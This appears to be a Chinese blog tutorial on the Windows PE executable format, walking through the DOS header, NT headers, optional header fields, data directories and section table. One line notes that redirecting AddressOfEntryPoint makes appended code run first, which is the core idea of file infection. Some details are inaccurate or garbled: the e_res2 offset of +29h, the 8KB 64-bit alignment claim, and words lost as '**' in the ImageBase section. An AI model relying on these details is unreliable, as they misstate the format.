<p>(2)64位Windows只是对PE格式做了简单的修饰，新格式叫PE32+。并没有将新的结构加进去，改变的只是简单的将32位字段扩展成64位。</p>
<p>(3)PE格式定义的主要地方位于头文件“winnt.h”。</p>
<p>(4)PE文件中的数据结构一般有32位和64位之分，一般在名称上会表现出来：如IMAGE_NT_HEADER32或者IMAGE_NT_HEADER64.</p>
<p>(5)PE结构的简略图如下两张</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/OIP-C.-9abkWaMsPlPnI87G8KPlgHaG8w=205&h=192&c=7&r=0&o=5&dpr=1.5&pid=1.jpeg" alt="PE结构图 的图像结果"></p>
<p>详细的图：</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZyZWVraW5nMTAx,size_16,color_FFFFFF,t_70.jpeg" alt="PE文件结构详解 --（完整版）_pe文件节的个数_擒贼先擒王的博客-CSDN博客"></p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>(1)PE文件使用的是一个平面地址空间，所i有代码和数据都被合并在一起，组成一个很大的结构。</p>
<p>(2)文件的内容被分割成不同的区块，块中包含代码或数据。各个按页边界来对齐，区块没有大小限制，是一个连续的结构。</p>
<p>(3)此外，每个块有自己在内存中的一套属性，比如说这个区块是否包含代码，是否只读或可读可写等。</p>
<p><strong>(4)PE文件不是作为单一内存映射文件被装入内存。</strong></p>
<p>(5)Windows加载器(又称PE加载器)遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到较高的内存地址中。</p>
<p>(6)当磁盘文件被装入内存中，磁盘上的数据结构布局和内存中的数据结构布局是一致的。</p>
<p>(7)数据之间的相对位置可能改变。</p>
<p>(8)几个重要概念</p>
<p>​	<strong>基地址(ImageBase)：PE结构的头地址。</strong></p>
<p>​	<strong>相对虚拟地址(RVA)：每一个区块的地址相对于基地址的偏移。</strong></p>
<p>​	<strong>虚拟地址(VA)：内存中各个区块所在的地址</strong></p>
<p>​	<strong>文件的偏移地址:PE文件存放在磁盘中的时候，PE结构各个块的首地址相对于文件头地址的偏移。</strong></p>
<h1 id="MS-DOS头部"><a href="#MS-DOS头部" class="headerlink" title="MS-DOS头部"></a>MS-DOS头部</h1><p>每个PE文件是以一个DOS程序开始的，有了它，一旦程序在DOS下执行，DOs才能识别出这是一个有效的执行体。PE文件的第一个字节起始于一个传统的MS-DOS头部，被称为<code>IMAGE_DOS_HEADER</code>.结构定义如下，<strong>主要关注第一个和最后一个</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT</span><br><span class="line">&#123;</span><br><span class="line">	+0hWORDe_magic //Magic DOS signature MZ(4Dh 5Ah)     DOS可执行文件标记</span><br><span class="line">	+2h WORDe_cblp//Bytes on last page of file  </span><br><span class="line">	+4hWORDe_cp//Pages in file</span><br><span class="line">	+6hWORD e_crlc//Relocations</span><br><span class="line">	+8hWORDe_cparhdr   //Size of header in paragraphs</span><br><span class="line">	+0ahWORD e_minalloc  //Minimun extra paragraphs needs</span><br><span class="line">	+0chWORDe_maxalloc  //Maximun extra paragraphs needs</span><br><span class="line">	+0ehWORDe_ss  //intial(relative)SS value     DOS代码的初始化堆栈SS</span><br><span class="line">	+10hWORDe_sp  //intial SP value              DOS代码的初始化堆栈指针SP</span><br><span class="line">	+12hWORDe_csum  //Checksum</span><br><span class="line">	+14hWORDe_ip  //    intial IP value          DOS代码的初始化指令入口[指针IP]</span><br><span class="line">	+16hWORDe_cs  //intial(relative)CS value     DOS代码的初始堆栈入口</span><br><span class="line">	+18hWORDe_lfarlc  //File Address of relocation table</span><br><span class="line">	+1ahWORDe_ovno        //    Overlay number</span><br><span class="line">	+1chWORDe_res[4]  //Reserved words</span><br><span class="line">	+24hWORDe_oemid  //    OEM identifier(for e_oeminfo)</span><br><span class="line">	+26hWORD      e_oeminfo   //    OEM information;e_oemid specific </span><br><span class="line">	+29hWORDe_res2[10]   //    Reserved words</span><br><span class="line">	+3chDWORD   e_lfanew     //Offset to start of PE header         指向PE文件头</span><br><span class="line">&#125; IMAGE_DOS_HEADER ENDS</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="PE文件头-PE-Header"><a href="#PE文件头-PE-Header" class="headerlink" title="PE文件头(PE Header)"></a>PE文件头(PE Header)</h1><p>PE文件头紧挨着DOS stub，是PE相关结构NT映像头(IMAGE_NT_HEADER)的简称，里面包含着许多PE装载器用到的重要字段。执行体在支持PE文件结构的操作系统中执行时，PE装载器将从IMAGE_DOS_HEADER结构中的e_lfanew字段里找到PE Header的真实偏移量，加上基地址就得到PE文件头的指针。PNTHeader&#x3D;ImageBase+dosHeader-&gt;e_lfanew。结构体的定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">  DWORD                 Signature;</span><br><span class="line">  IMAGE_FILE_HEADER     FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;</span><br></pre></td></tr></table></figure>

<h2 id="Signature字段"><a href="#Signature字段" class="headerlink" title="Signature字段"></a>Signature字段</h2><p>第一个参数是一个标志。在一个有效的PE文件里， Signature字段被设置为 00004550h, ASCI|| 字符码是： PE00。标志着PE文件的开头。</p>
<h2 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef     struct _IMAGE_FILE_HEADER </span><br><span class="line">&#123;</span><br><span class="line">	+04h    WORD        Machine;              // 运行平台</span><br><span class="line">	+06h    WORD        NumberOfSections;     // 文件的区块数目</span><br><span class="line">	+08h    DWORD       TimeDateStamp;        // 文件创建日期和时间</span><br><span class="line">	+0Ch    DWORD       PointerToSymbolTable; // 指向符号表(主要用于调试)</span><br><span class="line">	+10h    DWORD       NumberOfSymbols;      // 符号表中符号个数(同上)</span><br><span class="line">	+14h    WORD        SizeOfOptionalHeader; // IMAGE_OPTIONAL_HEADER32 结构大小</span><br><span class="line">	+16h    WORD        Characteristics;      // 文件属性</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<h3 id="1-Machine"><a href="#1-Machine" class="headerlink" title="(1)Machine"></a>(1)<strong>Machine</strong></h3><p>可执行文件的目标CPU类型。</p>
<table>
<thead>
<tr>
<th>code</th>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>IMAGE_FILE_MACHINE_I386</td>
<td>0x014c</td>
<td>x86</td>
</tr>
<tr>
<td>IMAGE_FILE_MACHINE_IA64</td>
<td>0x0200</td>
<td>Intel Itanium</td>
</tr>
<tr>
<td>IMAGE_FILE_MACHINE_AMD64</td>
<td>0x8664</td>
<td>x64</td>
</tr>
</tbody></table>
<h3 id="2-NumberOfSections"><a href="#2-NumberOfSections" class="headerlink" title="(2)NumberOfSections"></a>(2)NumberOfSections</h3><p>区块的数目。（注：区块表是紧跟在 IMAGE_NT_HEADERS 后边的）</p>
<h3 id="3-TimeDateStamp"><a href="#3-TimeDateStamp" class="headerlink" title="(3)TimeDateStamp"></a>(3)TimeDateStamp</h3><p>表明文件是何时被创建的。这个值是自1970年1月1日以来用格林威治时间（GMT）计算的秒数，这个值是比文件系统（FILESYSTEM）的日期时间更加精确的指示器。</p>
<h3 id="4-PointerToSymbolTable"><a href="#4-PointerToSymbolTable" class="headerlink" title="(4)PointerToSymbolTable"></a>(4)<strong>PointerToSymbolTable</strong></h3><p> COFF 符号表的文件偏移位置，现在基本没用了。</p>
<h3 id="5-NumberOfSymbols"><a href="#5-NumberOfSymbols" class="headerlink" title="(5)NumberOfSymbols"></a>(5)<strong>NumberOfSymbols</strong></h3><p>如果有COFF 符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF 符号表的结束位置，则需要这个变量。</p>
<h3 id="6-SizeOfOptionalHeader"><a href="#6-SizeOfOptionalHeader" class="headerlink" title="(6)SizeOfOptionalHeader"></a>(6)<strong>SizeOfOptionalHeader</strong></h3><p>紧跟着IMAGE_FILE_HEADER 后边的数据结构（IMAGE_OPTIONAL_HEADER）的大小。(对于32位PE文件，这个值通常是00E0h；对于64位PE32+文件，这个值是00F0h )。</p>
<h3 id="7-Characteristics"><a href="#7-Characteristics" class="headerlink" title="(7)Characteristics"></a>(7)<strong>Characteristics</strong></h3><p>文件属性，有选择的通过几个值可以运算得到。( 这些标志的有效值是定义于 winnt.h 内的 IMAGE_FILE_** 的值，具体含义见下表。普通的EXE文件这个字段的值一般是 0100h，DLL文件这个字段的值一般是 210Eh。)</p>
<table>
<thead>
<tr>
<th>数据位</th>
<th><strong>常量符号</strong></th>
<th><strong>为1的含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>IMAGE_ FILE_ RELOCS STRIPPED</td>
<td>文件中不存在重定位信息</td>
</tr>
<tr>
<td>1</td>
<td>IMAGE_ FILE_ EXECUTABLE_ IMAGE</td>
<td>文件是可执行的</td>
</tr>
<tr>
<td>2</td>
<td>IMAGE_ FILE_ LINE NUMS_STRIPPED</td>
<td>不存在行信息</td>
</tr>
<tr>
<td>3</td>
<td>IMAGE_ FILE_ LOCAL. SYMS_ STRIPPED</td>
<td>不存在符号信息</td>
</tr>
<tr>
<td>4</td>
<td>IMAGE_ FILE_ AGGRESSIVE_ Ws_ TRIM</td>
<td>调整工作集</td>
</tr>
<tr>
<td>5</td>
<td>IMAGE_ FILE_ LARGE_ ADDRESS _AWARE</td>
<td>应用程序可处理大于2GB的地址</td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>此标志保留</td>
</tr>
<tr>
<td>7</td>
<td>IMAGE_FILE_BYTES_REVERSED_LO</td>
<td>小尾方式</td>
</tr>
<tr>
<td>8</td>
<td>IMAGE_ FILE_ <em>32BIT</em> _MACHINE</td>
<td>只在32位平台上运行</td>
</tr>
<tr>
<td>9</td>
<td>IMAGE_ FILE_ DEBUG STRIPPED</td>
<td>不包含调试信息</td>
</tr>
<tr>
<td>10</td>
<td>IMAGE_ FILE_ REMOVABLE RUN_ FROM_ SWAP</td>
<td>不能从可移动盘运行</td>
</tr>
<tr>
<td>11</td>
<td>IMAGE_ FILE NET_ RUN_ FROM_SWAP</td>
<td>不能从网络运行</td>
</tr>
<tr>
<td>12</td>
<td>IMAGE_ FILE_ SYSTEM</td>
<td>系统文件(如驱动程序)，不能直接运行</td>
</tr>
<tr>
<td>13</td>
<td>IMAGE_ FILE_ DLL</td>
<td>这是一个DLL文件</td>
</tr>
<tr>
<td>14</td>
<td>IMAGE_ FILE_ UP_ SYSTEM_ONLY</td>
<td>文件不能在多处理器计算机上运行</td>
</tr>
<tr>
<td>15</td>
<td>IMAGE_ FILE_BYTES_ REVERSED_ HI</td>
<td>大尾方式</td>
</tr>
</tbody></table>
<p>多种属性可以通过 “或运算” 使得同时拥有。</p>
<h2 id="IMAGE-OPTIONAL-HEADER32"><a href="#IMAGE-OPTIONAL-HEADER32" class="headerlink" title="IMAGE_OPTIONAL_HEADER32"></a>IMAGE_OPTIONAL_HEADER32</h2><p>定义各个属性的作用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.  </span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">+<span class="number">18</span>h    WORD    Magic;         <span class="comment">// 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）</span></span><br><span class="line">+<span class="number">1</span>Ah    BYTE      MajorLinkerVersion;     <span class="comment">// 链接程序的主版本号</span></span><br><span class="line">+<span class="number">1B</span>h    BYTE      MinorLinkerVersion;     <span class="comment">// 链接程序的次版本号</span></span><br><span class="line">+<span class="number">1</span>Ch    DWORD   SizeOfCode;     <span class="comment">// 所有含代码的节的总大小</span></span><br><span class="line">+<span class="number">20</span>h    DWORD   SizeOfInitializedData;    <span class="comment">// 所有含已初始化数据的节的总大小</span></span><br><span class="line">+<span class="number">24</span>h    DWORD   SizeOfUninitializedData; <span class="comment">// 所有含未初始化数据的节的大小</span></span><br><span class="line">+<span class="number">28</span>h    DWORD   AddressOfEntryPoint;    <span class="comment">// 程序执行入口RVA</span></span><br><span class="line">+<span class="number">2</span>Ch    DWORD   BaseOfCode;      <span class="comment">// 代码的区块的起始RVA</span></span><br><span class="line">+<span class="number">30</span>h    DWORD   BaseOfData;      <span class="comment">// 数据的区块的起始RVA</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.    以下是属于NT结构增加的领域。</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">+<span class="number">34</span>h    DWORD   ImageBase;      <span class="comment">// 程序的首选装载地址</span></span><br><span class="line">+<span class="number">38</span>h    DWORD   SectionAlignment;      <span class="comment">// 内存中的区块的对齐大小</span></span><br><span class="line">+<span class="number">3</span>Ch    DWORD   FileAlignment;      <span class="comment">// 文件中的区块的对齐大小</span></span><br><span class="line">+<span class="number">40</span>h    WORD    MajorOperatingSystemVersion;  <span class="comment">// 要求操作系统最低版本号的主版本号</span></span><br><span class="line">+<span class="number">42</span>h    WORD    MinorOperatingSystemVersion;  <span class="comment">// 要求操作系统最低版本号的副版本号</span></span><br><span class="line">+<span class="number">44</span>h    WORD    MajorImageVersion;       <span class="comment">// 可运行于操作系统的主版本号</span></span><br><span class="line">+<span class="number">46</span>h    WORD    MinorImageVersion;       <span class="comment">// 可运行于操作系统的次版本号</span></span><br><span class="line">+<span class="number">48</span>h    WORD    MajorSubsystemVersion;  <span class="comment">// 要求最低子系统版本的主版本号</span></span><br><span class="line">+<span class="number">4</span>Ah    WORD    MinorSubsystemVersion;  <span class="comment">// 要求最低子系统版本的次版本号</span></span><br><span class="line">+<span class="number">4</span>Ch    DWORD   Win32VersionValue;       <span class="comment">// 莫须有字段，不被病毒利用的话一般为0</span></span><br><span class="line">+<span class="number">50</span>h    DWORD   SizeOfImage;       <span class="comment">// 映像装入内存后的总尺寸</span></span><br><span class="line">+<span class="number">54</span>h    DWORD   SizeOfHeaders;       <span class="comment">// 所有头 + 区块表的尺寸大小</span></span><br><span class="line">+<span class="number">58</span>h    DWORD   CheckSum;       <span class="comment">// 映像的校检和</span></span><br><span class="line">+<span class="number">5</span>Ch    WORD    Subsystem;       <span class="comment">// 可执行文件期望的子系统</span></span><br><span class="line">+<span class="number">5</span>Eh    WORD    DllCharacteristics;       <span class="comment">// DllMain()函数何时被调用，默认为 0</span></span><br><span class="line">+<span class="number">60</span>h    DWORD   SizeOfStackReserve;       <span class="comment">// 初始化时的栈大小</span></span><br><span class="line">+<span class="number">64</span>h    DWORD   SizeOfStackCommit;       <span class="comment">// 初始化时实际提交的栈大小</span></span><br><span class="line">+<span class="number">68</span>h    DWORD   SizeOfHeapReserve;        <span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">+<span class="number">6</span>Ch    DWORD   SizeOfHeapCommit;        <span class="comment">// 初始化时实际提交的堆大小</span></span><br><span class="line">+<span class="number">70</span>h    DWORD   LoaderFlags;        <span class="comment">// 与调试有关，默认为 0 </span></span><br><span class="line">+<span class="number">74</span>h    DWORD   NumberOfRvaAndSizes;  <span class="comment">// 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16</span></span><br><span class="line">+<span class="number">78</span>h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">       <span class="comment">// 数据目录表</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<h3 id="AddressOfEntryPoint字段"><a href="#AddressOfEntryPoint字段" class="headerlink" title="AddressOfEntryPoint字段"></a>AddressOfEntryPoint字段</h3><p>指出文件被执行时的入口地址，这是一个RVA地址。如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要将这个入口地址指向附加的代码就可以了。</p>
<h3 id="ImageBase字段"><a href="#ImageBase字段" class="headerlink" title="ImageBase字段"></a>ImageBase字段</h3><p>指出文件的优先装入地址。也就是说当文件被执行时，如果可能的话，Windows优先将文件装入到由ImageBase字段指定的地址中，只有指定的地址已经被<strong>模块使用时，文件才被装入到</strong>地址中。链接器产生可执行文件的时候对应这个地址来生成机器码，所以当文件被装入这个地址时不需要进行重定位操作，装入的速度最快，如果文件被装载到<strong>地址的话，将不得不进行重定位操作，这样就要慢一点。</strong></p>
<p><strong>对于EXE文件来说，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被</strong>模块占据，所以EXE总是能够按照这个地址装入，这也意味着EXE文件不再需要重定位信息。对于DLL文件来说，由于多个DLL文件全部使用宿主EXE文件的地址空间，不能保证优先装入地址没有被**的DLL使用，所以DLL文件中必须包含重定位信息以防万一。因此，在前面介绍的 IMAGE_FILE_HEADER 结构的 Characteristics 字段中，DLL 文件对应的 IMAGE_FILE_RELOCS_STRIPPED 位总是为0，而EXE文件的这个标志位总是为1。</p>
<p>在链接的时候，可以通过对link.exe指定&#x2F;base:address选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认优先装入地址被定为00400000h，而DLL文件的默认优先装入地址被定为10000000h。</p>
<h3 id="SectionAlignment-字段和-FileAlignment字段"><a href="#SectionAlignment-字段和-FileAlignment字段" class="headerlink" title="SectionAlignment 字段和 FileAlignment字段"></a>SectionAlignment 字段和 FileAlignment字段</h3><p>SectionAlignment字段指定了节被装入内存后的对齐单位。也就是说，每个节被装入的地址必定是本字段指定数值的整数倍。而FileAlignment字段指定了节存储在磁盘文件中时的对齐单位。</p>
<h3 id="Subsystem字段"><a href="#Subsystem字段" class="headerlink" title="Subsystem字段"></a>Subsystem字段</h3><p>指定使用界面的子系统。这个字段决定了系统如何为程序建立初始的界面，链接时的&#x2F;subsystem:**选项指定的就是这个字段的值，在前面章节的编程中我们早已知道：如果将子系统指定为Windows CUI，那么系统会自动为程序建立一个控制台窗口，而指定为Windows GUI的话，窗口必须由程序自己建立。</p>
<table>
<thead>
<tr>
<th>取值</th>
<th>Windows.inc中的预定义值</th>
<th>含  义</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>IMAGE_SUBSYSTEM_UNKNOWN</td>
<td>未知的子系统</td>
</tr>
<tr>
<td>1</td>
<td>IMAGE_SUBSYSTEM_NATIVE</td>
<td>不需要子系统（如驱动程序）</td>
</tr>
<tr>
<td>2</td>
<td>IMAGE_SUBSYSTEM_WINDOWS_GUI</td>
<td>Windows图形界面</td>
</tr>
<tr>
<td>3</td>
<td>IMAGE_SUBSYSTEM_WINDOWS_CUI</td>
<td>Windows控制台界面</td>
</tr>
<tr>
<td>5</td>
<td>IMAGE_SUBSYSTEM_OS2_CUI</td>
<td>OS2控制台界面</td>
</tr>
<tr>
<td>7</td>
<td>IMAGE_SUBSYSTEM_POSIX_CUI</td>
<td>POSIX控制台界面</td>
</tr>
<tr>
<td>8</td>
<td>IMAGE_SUBSYSTEM_NATIVE_WINDOWS</td>
<td>不需要子系统</td>
</tr>
<tr>
<td>9</td>
<td>IMAGE_SUBSYSTEM_WINDOWS_CE_GUI</td>
<td>Windows CE图形界面</td>
</tr>
</tbody></table>
<h3 id="DataDirectory字段"><a href="#DataDirectory字段" class="headerlink" title="DataDirectory字段"></a>DataDirectory字段</h3><p>这个字段可以说是最重要的字段之一，它由16个相同的IMAGE_DATA_DIRECTORY结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这16个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的数据块的。IMAGE_DATA_DIRECTORY结构的定义很简单，它仅仅指出了某种数据块的位置和长度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD VirtualAddress;    <span class="comment">// 数据表的起始虚拟地址</span></span><br><span class="line">    DWORD Size;    <span class="comment">// 数据表大小</span></span><br><span class="line">&#125;IMAGE_DATA_DIRECTORY,*IMAGE_DATA_DIRECTORY</span><br></pre></td></tr></table></figure>

<p>数据目录列表的含义</p>
<table>
<thead>
<tr>
<th>索  引</th>
<th>索引值在Windows.inc中的预定义值</th>
<th>对应的数据块</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>IMAGE_DIRECTORY_ENTRY_EXPORT</td>
<td>导出表</td>
</tr>
<tr>
<td>1</td>
<td>IMAGE_DIRECTORY_ENTRY_IMPORT</td>
<td>导入表</td>
</tr>
<tr>
<td>2</td>
<td>IMAGE_DIRECTORY_ENTRY_RESOURCE</td>
<td>资源</td>
</tr>
<tr>
<td>3</td>
<td>IMAGE_DIRECTORY_ENTRY_EXCEPTION</td>
<td>异常（具体资料不详）</td>
</tr>
<tr>
<td>4</td>
<td>IMAGE_DIRECTORY_ENTRY_SECURITY</td>
<td>安全（具体资料不详）</td>
</tr>
<tr>
<td>5</td>
<td>IMAGE_DIRECTORY_ENTRY_BASERELOC</td>
<td>重定位表</td>
</tr>
<tr>
<td>6</td>
<td>IMAGE_DIRECTORY_ENTRY_DEBUG</td>
<td>调试信息</td>
</tr>
<tr>
<td>7</td>
<td>IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</td>
<td>版权信息</td>
</tr>
<tr>
<td>8</td>
<td>IMAGE_DIRECTORY_ENTRY_GLOBALPTR</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>9</td>
<td>IMAGE_DIRECTORY_ENTRY_TLS</td>
<td>Thread Local Storage</td>
</tr>
<tr>
<td>10</td>
<td>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>11</td>
<td>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>12</td>
<td>IMAGE_DIRECTORY_ENTRY_IAT</td>
<td>导入函数地址表</td>
</tr>
<tr>
<td>13</td>
<td>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>14</td>
<td>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>15</td>
<td>未使用</td>
<td></td>
</tr>
</tbody></table>
<p>在PE文件中寻找特定的数据时就是从这些IMAGE_DATA_DIRECTORY结构开始的，比如要存取资源，那么必须从第3个IMAGE_DATA_DIRECTORY结构（索引为2）中得到资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的哪些API函数，那就必须首先从第2个IMAGE_DATA_DIRECTORY结构得到导入表的位置和大小。</p>
<h1 id="PE块表"><a href="#PE块表" class="headerlink" title="PE块表"></a>PE块表</h1><h2 id="PE文件到内存的映射"><a href="#PE文件到内存的映射" class="headerlink" title="PE文件到内存的映射"></a>PE文件到内存的映射</h2><p>在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用内存映射文件类似的机制。也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和文件之间的映射关系。当且只当真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会从磁盘提交到物理内存，这种机制使文件装入的速度和·文件大小没有太大的关系。但是要注意的时候系统装载可执行文件的方法又不完全等同于内存映射文件。当使用内存映射文件的时候，如果将磁盘文件和内存映射比较的话，可以发现不管是数据本身还是数据之间的相对位置都是完全相同的。Windows装载器在装载DOS部分、PE文件头部分和节表(区块表)部分是不进行任何特殊处理的，而在装载节(区块表)的时候哦则会自动按节(区块)的属性做不同的处理。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/20200528164529083817.png" alt="技术图片"></p>
<p>一般情况下，它会处理以下几个方面的内容:</p>
<p>内存页的属性;</p>
<p>节的偏移地址;</p>
<p>节的尺寸;</p>
<p>不进行映射的节。</p>
<h3 id="内存页的属性"><a href="#内存页的属性" class="headerlink" title="内存页的属性"></a>内存页的属性</h3><p>对于磁盘映射文件来说，所有的页都是按照磁盘映射文件函数指定的属性设置的。但是在装载可执行文件时，与节对应的内存页属性要按照节的属性来设置。所以，在同属于一个模块的内存页中，从不同节映射过来的的内存页的属性是不同的。</p>
<h3 id="节的偏移地址"><a href="#节的偏移地址" class="headerlink" title="节的偏移地址"></a>节的偏移地址</h3><p>节的起始地址在磁盘文件中是按照 IMAGE_OPTIONAL_HEADER32 结构的 FileAlignment 字段的值进行对齐的，而当被加载到内存中时是按照同一结构中的 SectionAlignment 字段的值对其的，两者的值可能不同，所以一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。注意，节事实上就是相同属性数据的组合！当节被装入到内存中的时候，相同一个节所对应的内存页都将被赋予相同的页属性， 事实上，Windows 系统对内存属性的设置是以页为单位进行的，所以节在内存中的对齐单位必须至少是一个页的大小。（对于32位操作系统来说，这个值一般是4KB&#x3D;&#x3D;1000H; 对于64位操作系统这个值一般是8KB&#x3D;&#x3D;2000H）</p>
<h3 id="节的尺寸"><a href="#节的尺寸" class="headerlink" title="节的尺寸"></a>节的尺寸</h3><p>对节的尺寸的处理主要分为两个方面：</p>
<p>第一个方面，正如刚刚我们所讲的，由于磁盘映像和内存映像中节对齐存储单位的不同而导致了长度扩展不同（填充的0数量不同）；</p>
<p>第二个方面，是对于包含未初始化数据的节的处理问题。既然是未初始化，那么没有必要为其在磁盘中浪费空间资源，但在内存中不同，因为程序一运行，之前未初始化的数据便有可能要被赋值初始化，那么就必须为他们留下空间。</p>
<h3 id="不进行映射的节"><a href="#不进行映射的节" class="headerlink" title="不进行映射的节"></a>不进行映射的节</h3><p>有些节并不需要被映射到内存中，例如.reloc节，重定位数据对于文件的执行代码来说是透明的，无作用的，它只是提供Windows 装载器使用，执行代码根本不会去访问到它们，所以没有必要将他们映射到物理内存中。</p>
<h2 id="节表（区块表）"><a href="#节表（区块表）" class="headerlink" title="节表（区块表）"></a>节表（区块表）</h2><p>PE文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的IMAGE_SECTION_HEADER结构作为结束，所以节表中总的IMAGE_SECTION_HEADER结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。另外，节表中 IMAGE_SECTION_HEADER 结构的总数总是由PE文件头 IMAGE_NT_HEADERS 结构中的 FileHeader.NumberOfSections 字段来指定的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        BYTE Name[IMAGE_SIZEOF_SHORT_NAME];     // 节表名称,如“.text” </span><br><span class="line"></span><br><span class="line">        //IMAGE_SIZEOF_SHORT_NAME=8</span><br><span class="line"></span><br><span class="line">        union</span><br><span class="line">         &#123;</span><br><span class="line"></span><br><span class="line">            DWORD PhysicalAddress;        // 物理地址</span><br><span class="line">			// 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个</span><br><span class="line">            DWORD VirtualSize; </span><br><span class="line"></span><br><span class="line">        &#125; Misc;</span><br><span class="line"></span><br><span class="line">        DWORD VirtualAddress;              // 节区的 RVA 地址</span><br><span class="line"></span><br><span class="line">        DWORD SizeOfRawData;            // 在文件中对齐后的尺寸</span><br><span class="line"></span><br><span class="line">        DWORD PointerToRawData;        // 在文件中的偏移量</span><br><span class="line"></span><br><span class="line">        DWORD PointerToRelocations;     // 在OBJ文件中使用，重定位的偏移</span><br><span class="line"></span><br><span class="line">        DWORD PointerToLinenumbers;   // 行号表的偏移（供调试使用地）</span><br><span class="line"></span><br><span class="line">        WORD NumberOfRelocations;      // 在OBJ文件中使用，重定位项数目</span><br><span class="line"></span><br><span class="line">        WORD NumberOfLinenumbers;    // 行号表中行号的数目</span><br><span class="line"></span><br><span class="line">        DWORD Characteristics;              // 节属性如可读，可写，可执行等&#125; &#125;IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; </span><br></pre></td></tr></table></figure>

